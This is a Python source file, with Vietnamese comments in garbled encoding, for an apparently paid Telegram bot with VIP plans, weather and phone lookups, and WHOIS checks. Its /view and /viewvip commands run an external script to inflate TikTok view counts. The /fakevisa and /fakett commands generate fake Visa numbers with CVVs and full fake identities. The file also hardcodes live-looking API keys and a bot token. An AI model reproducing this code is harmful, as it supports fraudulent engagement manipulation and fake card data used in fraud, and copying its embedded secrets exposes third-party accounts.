#bot l·ªè
import telebot
import psutil
import datetime
import time
import os
import subprocess
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import json
import io
import re
import threading
import logging
import whois
import ytsearch
import pyowm
import random
import tempfile
import phonenumbers
import openai
from faker import Faker
from telebot.types import Message
from tiktokpy import TikTokPy
from youtubesearchpython import VideosSearch
from pyowm.commons.exceptions import NotFoundError
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext
from collections import defaultdict
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
import shlex  # Th√™m d√≤ng n√†y ƒë·ªÉ import shlex

bot_token = '6873640340:AAG_s4yODod8dp51dblSLIeUdtkcqPYZuSA'  # Thay th·∫ø b·∫±ng token c·ªßa b·∫°n

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1002103359217

allowed_users = []
member_types = {}
processes = []
ADMIN_IDS = [6964080086, 6244038301]  # id admin
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}
last_time_used = {}  # Kh·ªüi t·∫°o t·ª´ ƒëi·ªÉn ƒë·ªÉ l∆∞u tr·ªØ th·ªùi gian l·∫ßn cu·ªëi s·ª≠ d·ª•ng

print('Bot L·ªè')


connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# T·∫°o b·∫£ng users n·∫øu n√≥ ch∆∞a t·ªìn t·∫°i
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

def TimeStamp():
    now = str(datetime.date.today())
    return now

def load_users_from_database():
    global allowed_users, member_types  # Th√™m member_types v√†o ƒë√¢y
    cursor.execute('PRAGMA table_info(users)')  # Ki·ªÉm tra xem c·ªôt member_type c√≥ t·ªìn t·∫°i kh√¥ng
    columns = cursor.fetchall()
    column_names = [col[1] for col in columns]
    if 'member_type' not in column_names:
        cursor.execute('ALTER TABLE users ADD COLUMN member_type TEXT')  # Th√™m c·ªôt member_type n·∫øu ch∆∞a t·ªìn t·∫°i
    cursor.execute('SELECT user_id, expiration_time, member_type FROM users')  # Ch·ªçn d·ªØ li·ªáu ng∆∞·ªùi d√πng t·ª´ b·∫£ng
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        allowed_users.append(user_id)
        member_types[user_id] = row[2]  # L∆∞u lo·∫°i th√†nh vi√™n v√†o t·ª´ ƒëi·ªÉn

def save_user_to_database(connection, user_id, expiration_time, member_type):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time, member_type)
        VALUES (?, ?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S'), member_type))
    connection.commit()

load_users_from_database()

# ƒêo·∫°n code d∆∞·ªõi ƒë√¢y s·∫Ω g·ªçi h√†m load_users_from_database() khi bot kh·ªüi ƒë·ªông
print("Bot L·ªè")


connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# T·∫°o b·∫£ng users n·∫øu n√≥ ch∆∞a t·ªìn t·∫°i
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

# Th√™m h√†m load_users_from_database() v√†o ƒë√¢y
load_users_from_database()


@bot.message_handler(commands=['addvip'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id not in ADMIN_IDS:
        bot.reply_to(message, '‚ùå L·ªánh add th√†nh vi√™n Vipüí≥ Ch·ªâ D√†nh Cho Admin !')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'H√£y Nh·∫≠p ƒê√∫ng ƒê·ªãnh D·∫°ng /add + [id] + [s·ªë_ng√†y]')
        return

    user_id = int(message.text.split()[1])
    try:
        days = int(message.text.split()[2])
    except ValueError:
        bot.reply_to(message, 'S·ªë ng√†y kh√¥ng h·ª£p l·ªá!')
        return

    current_time = datetime.datetime.now()
    expiration_time = current_time + datetime.timedelta(days=days)

    # Format ng√†y th√™m v√† ng√†y h·∫øt h·∫°n VIP
    add_date = current_time.strftime('%Y-%m-%d %H:%M:%S')
    expiration_date = expiration_time.strftime('%Y-%m-%d %H:%M:%S')

    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time, 'VIP')  # C·∫≠p nh·∫≠t member_type th√†nh "VIP"
    connection.close()

    bot.reply_to(message, f'ƒê√£ Th√™m ID: {user_id} Th√†nh Plan VIPüí≥ {days} Ng√†y\n'
                          f'Ng√†y Th√™m: {add_date}\n'
                          f'Ng√†y H·∫øt H·∫°n: {expiration_date}')

    # C·∫≠p nh·∫≠t tr·∫°ng th√°i th√†nh vi√™n VIP trong c∆° s·ªü d·ªØ li·ªáu v√† t·ª´ ƒëi·ªÉn member_types
    connection = sqlite3.connect('user_data.db')
    cursor = connection.cursor()
    cursor.execute('''UPDATE users SET member_type = ? WHERE user_id = ?''', ('VIP', user_id))
    connection.commit()
    member_types[user_id] = 'VIP'  # C·∫≠p nh·∫≠t tr·∫°ng th√°i c·ªßa ng∆∞·ªùi d√πng trong t·ª´ ƒëi·ªÉn member_types
    connection.close()
    allowed_users.append(user_id)  # Th√™m user m·ªõi v√†o danh s√°ch allowed_users



@bot.message_handler(commands=['removevip'])
def remove_user(message):
    admin_id = message.from_user.id
    if admin_id not in ADMIN_IDS:
        bot.reply_to(message, '‚ùå L·ªánh remove th√†nh vi√™n Vipüí≥ ch·ªâ d√†nh cho admin !')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'H√£y nh·∫≠p ƒë√∫ng ƒë·ªãnh d·∫°ng /remove + [id]')
        return

    user_id = int(message.text.split()[1])

    # Ki·ªÉm tra xem user_id c√≥ trong c∆° s·ªü d·ªØ li·ªáu hay kh√¥ng
    connection = sqlite3.connect('user_data.db')
    cursor = connection.cursor()
    cursor.execute('''SELECT * FROM users WHERE user_id = ?''', (user_id,))
    user = cursor.fetchone()
    connection.close()

    if user:  # N·∫øu user t·ªìn t·∫°i trong c∆° s·ªü d·ªØ li·ªáu
        connection = sqlite3.connect('user_data.db')
        cursor = connection.cursor()
        cursor.execute('''DELETE FROM users WHERE user_id = ?''', (user_id,))
        connection.commit()
        if user_id in member_types:  # Ki·ªÉm tra xem user_id c√≥ trong t·ª´ ƒëi·ªÉn member_types kh√¥ng
            del member_types[user_id]  # X√≥a tr·∫°ng th√°i c·ªßa ng∆∞·ªùi d√πng kh·ªèi t·ª´ ƒëi·ªÉn member_types
        connection.close()
        bot.reply_to(message, f'ƒê√£ x√≥a ng∆∞·ªùi d√πng c√≥ ID l√† : {user_id} kh·ªèi plan VIPüí≥ !')
    else:
        bot.reply_to(message, f'Ng∆∞·ªùi d√πng c√≥ ID l√† {user_id} kh√¥ng c√≥ trong c∆° s·ªü d·ªØ li·ªáu plan VIPüí≥ !')

@bot.message_handler(commands=['profile'])
def user_profile(message):
    user_id = message.from_user.id
    if user_id in ADMIN_IDS:
        bot.reply_to(message, 'üìÑ„Ä°User Information : Plan VIPüí≥ Forever !')
    else:
        member_type = member_types.get(user_id, 'Th∆∞·ªùng')  # L·∫•y lo·∫°i th√†nh vi√™n t·ª´ dictionary
        if member_type == 'VIP':
            bot.reply_to(message, 'üìÑ„Ä°User Information : Plan VIPüí≥ is still active !')
        else:
            bot.reply_to(message, 'üìÑ„Ä°User Information : Plan FREE B·∫°n l√† th√†nh vi√™n th∆∞·ªùng\nD√πng l·ªánh /muaplan n·∫øu b·∫°n mu·ªën mua VIPüí≥ !')

@bot.message_handler(commands=['getkey'])
def startkey(message):
    # G·ª≠i tin nh·∫Øn "Vui L√≤ng Ch·ªù Trong Gi√¢y L√°t,..."
    wait_message = bot.reply_to(message, text='Vui L√≤ng Ch·ªù Trong Gi√¢y L√°t,...')

    # T·∫°o lu·ªìng th·ª±c thi ƒë·ªÉ x√≥a tin nh·∫Øn sau 4 gi√¢y
    threading.Thread(target=delete_message_after_delay, args=(wait_message.chat.id, wait_message.message_id, 4)).start()

    # T·∫°o m√£ key d·ª±a tr√™n user ID v√† ng√†y hi·ªán t·∫°i
    key = "207" + str(int(message.from_user.id) * int(datetime.datetime.today().day) - 12666)
    key = "https://keyvip.elementfx.com/index.html?key=" + key
    print(key)
    
    # G·ª≠i y√™u c·∫ßu API ƒë·ªÉ r√∫t g·ªçn URL
    api_token = '0e835764-9c3b-4954-8c50-cf90d70066a2'
    url = requests.get(f'https://web1s.com/api?token={api_token}&url={key}').json()
    url_key = url['shortenedUrl']
    
    # T·∫°o tin nh·∫Øn v·ªõi key m·ªõi
    text = f'''
>> C·∫£m ∆†n B·∫°n ƒê√£ Getkey üåö
- Link L·∫•y Key H√¥m Nay L√†: {url_key}
- Nh·∫≠p Key B·∫±ng L·ªánh /key + [key] -
[L∆∞u √Ω: m·ªói key ch·ªâ c√≥ 1 ng∆∞·ªùi d√πng]
    '''
    
    # Ph·∫£n h·ªìi v·ªõi tin nh·∫Øn v√† key
    bot.reply_to(message, text)

# H√†m ƒë·ªÉ x√≥a tin nh·∫Øn sau m·ªôt kho·∫£ng th·ªùi gian
def delete_message_after_delay(chat_id, message_id, delay):
    time.sleep(delay)
    bot.delete_message(chat_id, message_id)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui L√≤ng Nh·∫≠p Key !\nV√≠ D·ª• /key 207123456789\nS·ª≠ D·ª•ng L·ªánh /getkey ƒê·ªÉ L·∫•y Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    expected_key = "207" + str(int(message.from_user.id) * int(datetime.datetime.today().day) - 12666)
    if key == expected_key:
        bot.reply_to(message, 'Nh·∫≠p Key Th√†nh C√¥ng')
    else:
        bot.reply_to(message, 'Key Sai Ho·∫∑c H·∫øt H·∫°n\nKh√¥ng S·ª≠ D·ª•ng Key C·ªßa Ng∆∞·ªùi Kh√°c!')






@bot.message_handler(commands=['sdt'])
def phone_info(message):
    # L·∫•y n·ªôi dung tin nh·∫Øn sau l·ªánh /sdt
    words = message.text.split()
    
    # Ki·ªÉm tra xem tin nh·∫Øn c√≥ ƒë·ªß ph·∫ßn t·ª≠ hay kh√¥ng
    if len(words) > 10:
        # L·∫•y s·ªë ƒëi·ªán tho·∫°i t·ª´ ph·∫ßn t·ª≠ th·ª© 1 (ph·∫ßn t·ª≠ th·ª© 0 l√† l·ªánh)
        phone_number = words[10].strip()

        try:
            # Ph√¢n t√≠ch s·ªë ƒëi·ªán tho·∫°i ƒë·ªÉ x√°c ƒë·ªãnh th√¥ng tin
            parsed_number = phonenumbers.parse(phone_number, None)

            # L·∫•y qu·ªëc gia
            country = phonenumbers.region_code_for_number(parsed_number)
            country_name = phonenumbers.region_name_for_number(parsed_number)

            # Ki·ªÉm tra xem s·ªë ƒëi·ªán tho·∫°i c√≥ h·ª£p l·ªá kh√¥ng
            is_valid = phonenumbers.is_valid_number(parsed_number)

            # L·∫•y lo·∫°i s·ªë ƒëi·ªán tho·∫°i (di ƒë·ªông, c·ªë ƒë·ªãnh, v.v.)
            phone_type = phonenumbers.number_type(parsed_number)
            phone_type_str = phonenumbers.number_type_name(phone_type)

            # Ki·ªÉm tra n·∫øu s·ªë ƒëi·ªán tho·∫°i thu·ªôc Vi·ªát Nam
            if country == 'VN':
                # Hi·ªÉn th·ªã th√¥ng tin s·ªë ƒëi·ªán tho·∫°i
                response = f"üìû S·ªë ƒëi·ªán tho·∫°i: {phone_number}\n"
                response += f"üåê Qu·ªëc gia: {country_name} ({country})\n"
                response += f"‚úÖ H·ª£p l·ªá: {'C√≥' if is_valid else 'Kh√¥ng'}\n"
                response += f"üì± Lo·∫°i s·ªë: {phone_type_str}"
                bot.reply_to(message, response)
            else:
                bot.reply_to(message, "‚ùå S·ªë ƒëi·ªán tho·∫°i kh√¥ng ph·∫£i t·ª´ Vi·ªát Nam!")

        except phonenumbers.phonenumberutil.NumberParseException as e:
            bot.reply_to(message, "‚ùå S·ªë ƒëi·ªán tho·∫°i kh√¥ng h·ª£p l·ªá!")
    else:
        bot.reply_to(message, "‚ùå Vui l√≤ng nh·∫≠p s·ªë ƒëi·ªán tho·∫°i sau l·ªánh /sdt!")









# Thi·∫øt l·∫≠p logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# L·ªánh /videotik ƒë·ªÉ g·ª≠i video t·ª´ ƒë∆∞·ªùng d·∫´n TikTok
@bot.message_handler(commands=['videotik'])
def send_tiktok_video(message):
    # Ki·ªÉm tra xem tin nh·∫Øn c√≥ ch·ª©a ƒë∆∞·ªùng d·∫´n ƒë·∫øn video kh√¥ng
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Vui l√≤ng nh·∫≠p ƒë∆∞·ªùng d·∫´n ƒë·∫øn video TikTok.")
        return

    # L·∫•y ƒë∆∞·ªùng d·∫´n ƒë·∫øn video t·ª´ tin nh·∫Øn c·ªßa ng∆∞·ªùi d√πng
    video_url = message.text.split()[1]

    try:
        # G·ª≠i video t·ª´ ƒë∆∞·ªùng d·∫´n tr·ª±c ti·∫øp
        bot.send_video(message.chat.id, video_url)
    except Exception as e:
        logger.error(f"ƒê√£ x·∫£y ra l·ªói khi g·ª≠i video: {e}")
        bot.reply_to(message, "ƒê√£ x·∫£y ra l·ªói khi g·ª≠i video.")




# L·ªánh /livevdtik ƒë·ªÉ theo d√µi s·ªë l∆∞·ª£t xem c·ªßa video TikTok m·ªói 2 gi√¢y
@bot.message_handler(commands=['livevdtik'])
def live_view_count(message):
    # Ki·ªÉm tra xem tin nh·∫Øn c√≥ ch·ª©a ƒë∆∞·ªùng d·∫´n ƒë·∫øn video TikTok kh√¥ng
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Vui l√≤ng nh·∫≠p ƒë∆∞·ªùng d·∫´n ƒë·∫øn video TikTok.")
        return

    # L·∫•y ƒë∆∞·ªùng d·∫´n ƒë·∫øn video t·ª´ tin nh·∫Øn c·ªßa ng∆∞·ªùi d√πng
    video_url = message.text.split()[1]

    # G·ª≠i y√™u c·∫ßu GET ƒë·ªÉ l·∫•y th√¥ng tin v·ªÅ video t·ª´ API TikTok
    try:
        response = requests.get(f"https://tokcounter.com/tiktok-live-view-counter?id={video_url}")
        if response.status_code == 200:
            data = response.json()
            if 'title' in data and 'video_view_count' in data:
                video_title = data['title']
                initial_view_count = data['video_view_count']
                bot.reply_to(message, f"ƒêang theo d√µi s·ªë l∆∞·ª£t xem c·ªßa video '{video_title}'...")

                # Theo d√µi s·ªë l∆∞·ª£t xem m·ªói 2 gi√¢y trong 60 gi√¢y
                view_counts = [initial_view_count]
                start_time = time.time()
                while time.time() - start_time < 60:
                    time.sleep(2)
                    response = requests.get(f"https://tokcounter.com/tiktok-live-view-counter?id={video_url}")
                    if response.status_code == 200:
                        data = response.json()
                        if 'video_view_count' in data:
                            current_view_count = data['video_view_count']
                            view_counts.append(current_view_count)
                            bot.reply_to(message, f"S·ªë l∆∞·ª£t xem c·ªßa video '{video_title}' l√† {current_view_count}")
                        else:
                            bot.reply_to(message, "Kh√¥ng th·ªÉ l·∫•y th√¥ng tin v·ªÅ s·ªë l∆∞·ª£t xem c·ªßa video.")
                            break
                    else:
                        bot.reply_to(message, "Kh√¥ng th·ªÉ l·∫•y th√¥ng tin v·ªÅ s·ªë l∆∞·ª£t xem c·ªßa video.")
                        break

                # T√≠nh to√°n v√† tr·∫£ l·ªùi v·ªÅ s·ªë l∆∞·ª£t xem ƒë√£ tƒÉng sau 60 gi√¢y
                final_view_count = view_counts[-1]
                increase_in_views = final_view_count - initial_view_count
                bot.reply_to(message, f"S·ªë l∆∞·ª£t xem c·ªßa video '{video_title}' ƒë√£ tƒÉng l√™n {increase_in_views} sau 60 gi√¢y")
            else:
                bot.reply_to(message, "Kh√¥ng th·ªÉ l·∫•y th√¥ng tin v·ªÅ video t·ª´ ƒë∆∞·ªùng d·∫´n ƒë√£ cung c·∫•p.")
        else:
            bot.reply_to(message, "Kh√¥ng th·ªÉ l·∫•y th√¥ng tin v·ªÅ video t·ª´ ƒë∆∞·ªùng d·∫´n ƒë√£ cung c·∫•p.")
    except Exception as e:
        bot.reply_to(message, "ƒê√£ x·∫£y ra l·ªói khi x·ª≠ l√Ω y√™u c·∫ßu")






# Kh·ªüi t·∫°o client OpenWeatherMap
owm = pyowm.OWM('8eb6660f9b1b6915bbbddf2f97f7f711')  # Thay 'YOUR_OW_API_KEY' b·∫±ng kh√≥a API OpenWeatherMap th·ª±c t·∫ø c·ªßa b·∫°n
accuweather_api_key = 'aGaNDLyQYhHhOjcIr2aWNlFzOM0X3Quo'  # Thay 'YOUR_ACCUWEATHER_API_KEY' b·∫±ng kh√≥a API AccuWeather th·ª±c t·∫ø c·ªßa b·∫°n

# H√†m ƒë·ªÉ l·∫•y th√¥ng tin ch·ªâ s·ªë UV t·ª´ AccuWeather API
def get_uv_index(location):
    try:
        response = requests.get(f'http://dataservice.accuweather.com/currentconditions/v1/{location}?apikey={accuweather_api_key}&details=true')
        data = response.json()
        uv_index = data[0]['UVIndex']
        return uv_index
    except Exception as e:
        print(f"Error getting UV index: {e}")
        return None

def get_detailed_weather_info(location):
    try:
        observation = owm.weather_manager().weather_at_place(location)
        weather = observation.weather
        temperature = weather.temperature('celsius')
        wind = weather.wind()
        humidity = weather.humidity
        pressure = weather.pressure
        status = weather.detailed_status
        uv_index = get_uv_index(location)
        air_quality = "None"  # C·∫ßn API ri√™ng ƒë·ªÉ l·∫•y th√¥ng tin ch·∫•t l∆∞·ª£ng kh√¥ng kh√≠
        dew_point = "Unclear"  # C·∫ßn API ri√™ng ƒë·ªÉ l·∫•y th√¥ng tin ƒëi·ªÉm s∆∞∆°ng
        
        weather_info = f"üîÜTh√¥ng Tin Th·ªùi Ti·∫øt ·ªü {location}\n\n"
        weather_info += f"üå°Ô∏èNhi·ªát ƒê·ªô : {temperature['temp']}¬∞C\n"
        weather_info += f"üí®T·ªëc ƒê·ªô Gi√≥ : {wind['speed']} m/s\n"
        weather_info += f"üå¨H∆∞·ªõng Gi√≥ : {wind['deg']}¬∞\n"
        weather_info += f"üí¶ƒê·ªô ·∫®m : {humidity}%\n"
        weather_info += f"üí•√Åp Su·∫•t : {pressure['press']} hPa\n"
        weather_info += f"üåèT√¨nh Tr·∫°ng : {status}\n"
        weather_info += f"‚òÄÔ∏èCh·ªâ S·ªë UV : {uv_index}\n" if uv_index is not None else "‚òÄÔ∏èCh·ªâ S·ªë UV : None\n"
        weather_info += f"üè≠Ch·∫•t L∆∞·ª£ng Kh√¥ng Kh√≠ : {air_quality}\n"
        weather_info += f"üíßƒêi·ªÉm S∆∞∆°ng : {dew_point}\nüåßL∆∞·ª£ng M∆∞a : 0%"
        return weather_info
    except NotFoundError:
        return f"Kh√¥ng th·ªÉ t√¨m th·∫•y th√¥ng tin th·ªùi ti·∫øt cho {location}\nVui l√≤ng nh·∫≠p t√™n th√†nh ph·ªë ho·∫∑c t·ªânh th√†nh h·ª£p l·ªá t·∫°i Vi·ªát Nam\nM·ªôt S·ªë N∆°i Kh√¥ng Th·ªÉ Tra ƒê∆∞·ª£c Th√¥ng Tin"
    except Exception as e:
        return f"C√≥ l·ªói x·∫£y ra khi truy xu·∫•t th√¥ng tin th·ªùi ti·∫øt: {str(e)}"

@bot.message_handler(commands=['tt', 'tt@Autospam_sms_bot'])
def detailed_weather_info(message):
    # L·∫•y ƒë·ªãa ƒëi·ªÉm t·ª´ c√°c ƒë·ªëi s·ªë l·ªánh
    location = message.text.replace("/tt", "").strip()
    
    # Ki·ªÉm tra xem ƒë√£ cung c·∫•p ƒë·ªãa ƒëi·ªÉm ch∆∞a
    if not location:
        bot.reply_to(message, "Vui l√≤ng cung c·∫•p ƒë·ªãa ƒëi·ªÉm !\nExample : /tt H√† N·ªôi")
        return
    
    # L·∫•y th√¥ng tin th·ªùi ti·∫øt chi ti·∫øt cho ƒë·ªãa ƒëi·ªÉm cung c·∫•p
    weather_info_text = get_detailed_weather_info(location)
    
    # G·ª≠i th√¥ng tin th·ªùi ti·∫øt chi ti·∫øt nh∆∞ m·ªôt ph·∫£n h·ªìi
    bot.reply_to(message, weather_info_text)







fake = Faker()

# H√†m ƒë·ªÉ t·∫°o ng·∫´u nhi√™n nh√≥m m√°u
def generate_blood_group():
    blood_groups = ['A', 'B', 'AB', 'O']
    rh_factors = ['+', '-']
    return random.choice(blood_groups) + random.choice(rh_factors)

# L·ªánh /randomtt ƒë·ªÉ t·∫°o th√¥ng tin ng∆∞·ªùi d√πng ·∫£o
@bot.message_handler(commands=['fakett'])
def random_user_info(message):
    # T·∫°o th√¥ng tin ng∆∞·ªùi d√πng ·∫£o
    full_name = fake.name()
    gender = random.choice(['Nam', 'N·ªØ'])
    pronoun = random.choice(['Anh', 'Ch·ªã', 'Em'])
    dob = fake.date_of_birth(minimum_age=18, maximum_age=60)
    address = fake.address()
    email = fake.email()
    phone_number = fake.phone_number()
    job = fake.job()
    username = fake.user_name()
    company = fake.company()
    country = fake.country()
    language_code = fake.language_code()
    credit_card_number = fake.credit_card_number()
    zip_code = fake.postcode()
    height = fake.random_int(min=155, max=180)
    weight = fake.random_int(min=54, max=80)
    eye_color = fake.color_name()
    hair_color = fake.color_name()
    blood_group = generate_blood_group()  # T·∫°o ng·∫´u nhi√™n nh√≥m m√°u

    # T√≠nh ch·ªâ s·ªë BMI
    bmi = round((weight / ((height / 100) ** 2)), 2)

    # T·∫°o tin nh·∫Øn ph·∫£n h·ªìi v·ªõi th√¥ng tin ng·∫´u nhi√™n v·ªÅ ng∆∞·ªùi d√πng, ch·ªâ s·ªë BMI v√† nh√≥m m√°u
    response_message = (
        f"üë§ H·ªç v√† t√™n: {full_name}\n"
        f"üöª Gi·ªõi t√≠nh: {gender}\n"
        f"üë§ Danh x∆∞ng: {pronoun}\n"
        f"üìÖ Ng√†y sinh: {dob}\n"
        f"üè† ƒê·ªãa ch·ªâ: {address}\n"
        f"üìß Email: {email}\n"
        f"üìû S·ªë ƒëi·ªán tho·∫°i: {phone_number}\n"
        f"üíº Ngh·ªÅ nghi·ªáp: {job}\n"
        f"üë§ T√™n ng∆∞·ªùi d√πng: {username}\n"
        f"üè¢ C√¥ng ty: {company}\n"
        f"üåç Qu·ªëc gia: {country}\n"
        f"üî§ M√£ ng√¥n ng·ªØ: {language_code}\n"
        f"üí≥ S·ªë th·∫ª t√≠n d·ª•ng: {credit_card_number}\n"
        f"üè† M√£ Zip: {zip_code}\n"
        f"üìè Chi·ªÅu cao: {height} cm\n"
        f"‚öñÔ∏è C√¢n n·∫∑ng: {weight} kg\n"
        f"üëÅÔ∏è M√†u m·∫Øt: {eye_color}\n"
        f"üíá‚Äç‚ôÇÔ∏è M√†u t√≥c: {hair_color}\n"
        f"ü©∏ Nh√≥m m√°u: {blood_group}\n"
        f"ü©∫ Ch·ªâ s·ªë BMI: {bmi}"
    )

    # G·ª≠i tin nh·∫Øn ph·∫£n h·ªìi v·ªõi th√¥ng tin ng∆∞·ªùi d√πng ·∫£o, ch·ªâ s·ªë BMI v√† nh√≥m m√°u
    bot.reply_to(message, response_message)




fake = Faker()

# L·ªánh /fakevisa ƒë·ªÉ t·∫°o th√¥ng tin th·∫ª t√≠n d·ª•ng ·∫£o
@bot.message_handler(commands=['fakevisa'])
def fake_credit_card_info(message):
    # T·∫°o th√¥ng tin th·∫ª t√≠n d·ª•ng ·∫£o
    card_number = fake.credit_card_number(card_type='visa')
    expiration_date = fake.credit_card_expire()
    cvv = fake.credit_card_security_code(card_type='visa')

    # T·∫°o tin nh·∫Øn ph·∫£n h·ªìi v·ªõi th√¥ng tin th·∫ª t√≠n d·ª•ng ·∫£o
    response_message = (
        f"‚ÑπÔ∏è S·ªë th·∫ª: {card_number}\n"
        f"üìÖ Ng√†y h·∫øt h·∫°n: {expiration_date}\n"
        f"üîí M√£ CVV: {cvv}"
    )

    # G·ª≠i tin nh·∫Øn ph·∫£n h·ªìi v·ªõi th√¥ng tin th·∫ª t√≠n d·ª•ng ·∫£o
    bot.reply_to(message, response_message)








@bot.message_handler(commands=['kiemtra'])
def check_domain(message):
    # L·∫•y t√™n mi·ªÅn t·ª´ tin nh·∫Øn
    domain = message.text.replace("/kiemtra", "").strip()
    
    # Ki·ªÉm tra xem ƒë√£ cung c·∫•p t√™n mi·ªÅn ch∆∞a
    if not domain:
        bot.reply_to(message, "Vui l√≤ng Nh·∫≠p t√™n mi·ªÅn !\nV√≠ d·ª• : /kiemtra example.com")
        return
    
    # Th·ª±c hi·ªán truy v·∫•n WHOIS
    try:
        w = whois.whois(domain)
        if w.domain_name:
            bot.reply_to(message, f"T√™n mi·ªÅn {domain} ƒë√£ ƒë∆∞·ª£c ƒëƒÉng k√Ω")
        else:
            bot.reply_to(message, f"T√™n mi·ªÅn {domain} ch∆∞a ƒë∆∞·ª£c ƒëƒÉng k√Ω")
    except Exception as e:
        bot.reply_to(message, f"C√≥ l·ªói x·∫£y ra: {str(e)}")




last_view_time = {}  # T·∫°o t·ª´ ƒëi·ªÉn ƒë·ªÉ l∆∞u th·ªùi ƒëi·ªÉm cu·ªëi c√πng m√† ng∆∞·ªùi d√πng s·ª≠ d·ª•ng l·ªánh /view

@bot.message_handler(commands=['view'])
def viewtiktok_command(message):
    global last_view_time

    # Ki·ªÉm tra xem tin nh·∫Øn ƒë·∫øn t·ª´ m·ªôt nh√≥m hay kh√¥ng
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        bot.send_message(message.chat.id, ">> Xin L·ªói T√¥i Ch·ªâ Ho·∫°t ƒê·ªông Tr√™n Nh√≥m : https://t.me/botvipfc")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, '>> C√°ch ƒê·ªÉ Buff View\n/view [url video] [s·ªë l∆∞·ª£ng view]\nEx : /view https://tiktok.com/ 500')
        return

    url, amount = args[1], args[2]
    if int(amount) > 500:
        bot.send_message(message.chat.id, "View t·ªëi ƒëa l√† 500")
        return

    # Ki·ªÉm tra th·ªùi gian cu·ªëi c√πng ng∆∞·ªùi d√πng s·ª≠ d·ª•ng l·ªánh /view
    if message.chat.id in last_view_time:
        time_passed = datetime.datetime.now() - last_view_time[message.chat.id]
        if time_passed.total_seconds() < 300:  # Ki·ªÉm tra xem ƒë√£ ƒë·ª£i ƒë·ªß 300 gi√¢y ch∆∞a
            remaining_time = 300 - time_passed.total_seconds()
            bot.send_message(message.chat.id, f"Vui l√≤ng ch·ªù th√™m {int(remaining_time)} gi√¢y ƒë·ªÉ ti·∫øp t·ª•c s·ª≠ d·ª•ng")
            return
    last_view_time[message.chat.id] = datetime.datetime.now()  # L∆∞u th·ªùi gian cu·ªëi c√πng ng∆∞·ªùi d√πng s·ª≠ d·ª•ng l·ªánh /view

    cmd_to_run = f'cmd /c start python view.py {shlex.quote(url)} {shlex.quote(amount)}'
    subprocess.run(cmd_to_run, shell=True)

    today = datetime.datetime.now().strftime('%d-%m-%Y')

    response_message = (
        f'‚û§ UserID : {message.from_user.id}\n'
        f'‚û§ URL : {url}\n'
        f'‚û§ S·ªë View : {amount} views\n'
        f'‚û§ Tr·∫°ng Th√°i : Th√†nh C√¥ng\n'
        f'‚û§ Time : {today}\n'
        f'‚û§ Plan : ùêÖùê´ùêûùêû\n'
        f'‚û§ Owner : @minhduc3919\n'
    )
    bot.send_message(message.chat.id, response_message)



@bot.message_handler(commands=['viewvip'])
def viewtiktok_command(message):
    global last_view_time

    # Ki·ªÉm tra xem tin nh·∫Øn ƒë·∫øn t·ª´ m·ªôt nh√≥m ho·∫∑c si√™u nh√≥m kh√¥ng
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        bot.send_message(message.chat.id, ">> Xin L·ªói T√¥i Ch·ªâ Ho·∫°t ƒê·ªông Tr√™n Nh√≥m : https://t.me/botvipfc")
        return

    user_id = message.from_user.id
    if user_id not in ADMIN_IDS and user_id not in allowed_users:
        bot.send_message(message.chat.id, "‚ö†Ô∏è G√≥i Vip c·ªßa b·∫°n kh√¥ng t·ªìn t·∫°i ho·∫∑c ƒë√£ h·∫øt h·∫°n\nVui l√≤ng li√™n h·ªá @minhduc3919 ƒë·ªÉ mua g√≥i VIP\nS·ª≠ d·ª•ng /profile ƒë·ªÉ ki·ªÉm tra Plan\nD√πng L·ªánh /muaplan ƒê·ªÉ Xem Gi√°\n\nüö´ S·ª≠ d·ª•ng l·ªánh /view n·∫øu b·∫°n l√† ng∆∞·ªùi d√πng Free")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, '>> C√°ch ƒê·ªÉ Buff View VIP üí≥ \n/viewvip [url video] [M·∫∑c ƒê·ªãnh 3k]\nEx : /viewvip https://tiktok.com/ 3000')
        return

    url, amount = args[1], args[2]
    if int(amount) > 3000:
        bot.send_message(message.chat.id, "View t·ªëi ƒëa l√† 3000")
        return

    # Ki·ªÉm tra th·ªùi gian cu·ªëi c√πng ng∆∞·ªùi d√πng s·ª≠ d·ª•ng l·ªánh /viewvip
    if message.chat.id in last_view_time:
        time_passed = datetime.datetime.now() - last_view_time[message.chat.id]
        if time_passed.total_seconds() < 300:  # Ki·ªÉm tra xem ƒë√£ ƒë·ª£i ƒë·ªß 300 gi√¢y ch∆∞a
            remaining_time = 300 - time_passed.total_seconds()
            bot.send_message(message.chat.id, f"Vui l√≤ng ch·ªù th√™m {int(remaining_time)} gi√¢y ƒë·ªÉ ti·∫øp t·ª•c s·ª≠ d·ª•ng")
            return
